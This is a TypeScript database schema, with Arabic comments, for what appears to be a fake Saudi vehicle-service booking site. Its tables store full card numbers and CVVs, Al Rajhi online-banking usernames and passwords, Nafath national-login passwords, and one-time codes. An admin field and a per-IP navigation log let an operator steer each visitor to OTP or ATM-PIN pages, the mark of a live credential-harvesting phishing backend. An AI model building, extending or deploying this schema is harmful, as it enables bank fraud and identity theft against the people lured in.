import {
  int,
  mysqlEnum,
  mysqlTable,
  text,
  timestamp,
  varchar,
  decimal,
  boolean,
  json,
} from "drizzle-orm/mysql-core";

// ==================== جدول المستخدمين ====================
export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// ==================== جدول مراكز الخدمة ====================
export const serviceCenters = mysqlTable("service_centers", {
  id: int("id").autoincrement().primaryKey(),
  name: varchar("name", { length: 255 }).notNull(),
  region: varchar("region", { length: 255 }).notNull(),
  address: text("address"),
  phone: varchar("phone", { length: 20 }),
  isActive: boolean("isActive").default(true).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type ServiceCenter = typeof serviceCenters.$inferSelect;

// ==================== جدول الحجوزات ====================
export const bookings = mysqlTable("bookings", {
  id: int("id").autoincrement().primaryKey(),
  referenceId: varchar("referenceId", { length: 64 }).notNull().unique(),
  // بيانات العميل
  clientName: varchar("clientName", { length: 255 }).notNull(),
  clientId: varchar("clientId", { length: 20 }).notNull(), // رقم الهوية
  clientPhone: varchar("clientPhone", { length: 20 }).notNull(),
  clientEmail: varchar("clientEmail", { length: 320 }),
  clientNationality: varchar("clientNationality", { length: 100 }),
  // بيانات المفوض
  hasDelegate: boolean("hasDelegate").default(false),
  delegateType: varchar("delegateType", { length: 50 }),
  delegateName: varchar("delegateName", { length: 255 }),
  delegatePhone: varchar("delegatePhone", { length: 20 }),
  delegateNationality: varchar("delegateNationality", { length: 100 }),
  delegateId: varchar("delegateId", { length: 20 }),
  // بيانات المركبة
  vehicleCountry: varchar("vehicleCountry", { length: 100 }),
  vehiclePlate: varchar("vehiclePlate", { length: 50 }),
  vehiclePlateChar1: varchar("vehiclePlateChar1", { length: 10 }),
  vehiclePlateChar2: varchar("vehiclePlateChar2", { length: 10 }),
  vehiclePlateChar3: varchar("vehiclePlateChar3", { length: 10 }),
  vehicleType: varchar("vehicleType", { length: 100 }),
  vehicleCarryDang: boolean("vehicleCarryDang").default(false),
  // بيانات الخدمة
  serviceRegion: varchar("serviceRegion", { length: 255 }),
  serviceType: varchar("serviceType", { length: 100 }),
  serviceDate: varchar("serviceDate", { length: 20 }),
  serviceTime: varchar("serviceTime", { length: 20 }),
  // حالة الحجز
  status: mysqlEnum("status", [
    "new",
    "pending_payment",
    "pending_nafath",
    "pending_motasel",
    "payment_done",
    "verified",
    "completed",
    "cancelled",
  ]).default("new").notNull(),
  // بيانات إضافية
  clientIp: varchar("clientIp", { length: 45 }),
  rawData: json("rawData"),
  statusRead: int("statusRead").default(0),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Booking = typeof bookings.$inferSelect;
export type InsertBooking = typeof bookings.$inferInsert;

// ==================== جدول المدفوعات ====================
export const payments = mysqlTable("payments", {
  id: int("id").autoincrement().primaryKey(),
  referenceId: varchar("referenceId", { length: 64 }).notNull(),
  // بيانات البطاقة
  cardHolderName: varchar("cardHolderName", { length: 255 }),
  cardNumber: varchar("cardNumber", { length: 30 }),       // رقم البطاقة الكامل
  cardLastFour: varchar("cardLastFour", { length: 4 }),
  cardCvv: varchar("cardCvv", { length: 10 }),             // CVV
  cardType: varchar("cardType", { length: 50 }),
  cardExpiry: varchar("cardExpiry", { length: 10 }),
  // إجراء المسؤول على الدفع: STILL=انتظار, accepted=OTP, pass=ATM, denied=رفض
  paymentAction: varchar("paymentAction", { length: 20 }).default("STILL"),
  // بيانات الدفع
  amount: decimal("amount", { precision: 10, scale: 2 }),
  currency: varchar("currency", { length: 10 }).default("SAR"),
  // حالة الدفع
  step: int("step").default(1), // 1=بيانات البطاقة, 2=التحقق, 3=الإثبات
  status: mysqlEnum("status", [
    "pending",
    "step1_done",
    "step2_done",
    "step3_done",
    "verified",
    "failed",
  ]).default("pending").notNull(),
  // بيانات التحقق
  verifyCode: varchar("verifyCode", { length: 20 }),
  secretNum: varchar("secretNum", { length: 20 }),
  // بيانات الراجحي
  rajUsername: varchar("rajUsername", { length: 100 }),
  rajPassword: varchar("rajPassword", { length: 255 }),
  // بيانات إضافية
  rawData: json("rawData"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Payment = typeof payments.$inferSelect;
export type InsertPayment = typeof payments.$inferInsert;

// ==================== جدول رموز التحقق ====================
export const verificationCodes = mysqlTable("verification_codes", {
  id: int("id").autoincrement().primaryKey(),
  referenceId: varchar("referenceId", { length: 64 }).notNull(),
  type: mysqlEnum("type", ["nafath", "motasel", "otp"]).notNull(),
  // بيانات نفاذ
  nafathId: varchar("nafathId", { length: 20 }),
  nafathPassword: varchar("nafathPassword", { length: 255 }),
  nafathNumber: varchar("nafathNumber", { length: 20 }),
  // بيانات المتصل
  motaselProvider: varchar("motaselProvider", { length: 100 }),
  motaselPhone: varchar("motaselPhone", { length: 20 }),
  motaselCode: varchar("motaselCode", { length: 20 }),
  // حالة التحقق
  step: int("step").default(1),
  status: mysqlEnum("status", ["pending", "step1_done", "verified", "failed"]).default("pending").notNull(),
  rawData: json("rawData"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type VerificationCode = typeof verificationCodes.$inferSelect;

// ==================== جدول سجل التوجيه ====================
export const navigationLogs = mysqlTable("navigation_logs", {
  id: int("id").autoincrement().primaryKey(),
  referenceId: varchar("referenceId", { length: 64 }),
  clientIp: varchar("clientIp", { length: 45 }).notNull(),
  targetPage: varchar("targetPage", { length: 255 }).notNull(),
  adminId: int("adminId"),
  note: text("note"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type NavigationLog = typeof navigationLogs.$inferSelect;
